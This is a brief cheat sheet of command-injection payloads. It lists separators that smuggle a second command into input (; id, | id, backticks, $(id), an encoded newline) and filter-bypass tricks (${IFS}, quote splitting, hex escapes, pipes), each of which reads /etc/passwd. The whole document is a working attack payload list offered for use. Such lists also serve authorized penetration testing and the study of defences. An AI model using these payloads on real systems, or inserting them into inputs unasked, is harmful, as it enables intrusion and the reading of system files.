## Command Injection

### Test Payloads
```
; id
| id
&& id
` id `
$(id)
%0a id          # URL-encoded newline
```

### Bypass Filters
```bash
# Space bypass
cat${IFS}/etc/passwd
cat</etc/passwd

# String concatenation
c'at' /etc/passwd
/bin/ca$'\x74' /etc/passwd

# Semicolon blocked — try pipes
ls|cat /etc/passwd
```

